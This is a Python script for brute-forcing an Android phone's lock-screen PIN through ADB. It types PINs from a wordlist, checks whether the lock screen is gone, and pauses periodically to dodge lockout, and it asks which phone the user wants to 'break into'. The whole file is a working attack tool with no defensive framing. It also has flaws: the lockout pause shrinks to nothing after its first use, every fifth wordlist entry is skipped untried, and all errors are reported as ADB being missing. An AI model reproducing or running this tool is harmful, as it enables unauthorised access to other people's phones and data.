import banner
import os
import time
from colorama import Fore
import subprocess

def help():
    print("""       1. Make sure that ADB is installed in your PC
        2. Having SCRCPY is not a requirement but is recommended
        3. You must have a file containing possible PINs""")

def check_lock():
    command = "adb shell dumpsys window | grep mDreamingLockscreen"
    is_locked = subprocess.run(command, shell=True, text=True, capture_output=True)
    results = is_locked.stdout.strip()
    if 'mDreamingLockscreen=false' in results:
        return False
    elif 'mDreamingLockscreen=true' in results:
        return True
    else:
        print("An unknown error has occurred")
        return
def main():
    attempts = 0
    sleep = 30
    try:
        Fore.BLUE
        os.system('clear')
        banner.main()
        phonename = input("Enter the name of a phone you want to bruteforce into(e.g Samsung): ").strip().upper()
        phonetype = input("Enter the phone type  you're trying to bruteforce(e.g Galaxy): ").strip().upper()
        phonemodel = input("Enter the class of the phon you're trying to bruteforce(e.g A15): ").strip().upper()
        print(f"\nAccording to the details you provided, you are trying to break into {Fore.YELLOW}{phonename} {phonetype} {phonemodel}{Fore.BLUE}\n")
        input("\nPress ENTER to confirm these details, otherwise press Ctrl and C simultaneously")
        wordlist = input("Enter a full path to your wordlist(e.g /path/to/your/wordlist.txt): ")
        print(f"Opening {wordlist}")
        time.sleep(0.5)
        with open(wordlist, 'r+') as file:
            avoid_lockout = 0
            try:
                os.system('adb devices')
                os.system('adb shell input keyevent 26')
                time.sleep(1)
                os.system('adb shell input keyevent 82')
                time.sleep(1)
                for line in file:
                    attempts += 1
                    avoid_lockout += 1
                    if not check_lock():
                        print(f"{Fore.RED}Apparently the phone was already unlocked{Fore.BLUE}")
                        break
                    if avoid_lockout < 5:
                        print(f"Attempting {Fore.GREEN}{line}{Fore.BLUE} against the PIN")
                        os.system(f'adb shell input text {line.strip()}')
                        time.sleep(2)
                        if not check_lock():
                            print(f"PIN cracked: {Fore.YELLOW}{line}{Fore.BLUE} after {attempts} attempt(s)")
                            break
                        else:
                            continue
                    else:
                        print(f"Avoiding lockout, the code is sleeping for {sleep} after {avoid_lockout} attempts")
                        os.system('adb shell input keyevent 26')
                        for i in range(sleep, 0, -1):
                            time.sleep(1)
                            sleep -= 1
                            print(f"{i}s remaining")
                        avoid_lockout = 0
                        os.system('adb shell input keyevent 26')
                        time.sleep(1)
                        os.system('adb shell input keyevent 82')
            except:
                print("ADB(Android Debug Bridge) is not installed")

    except KeyboardInterrupt:
        try:
            os.system('clear')
            banner.main()
            time.sleep(1.5)
            os.system('exit')
        except:
            os.system('cls')
            banner.main()
            time.sleep(1.5)
            os.system('exit')
    except Exception as error:
        Fore.BLUE
        os.system('cls')
        print(f"{error} has occurred")


if __name__ == "__main__":
    main()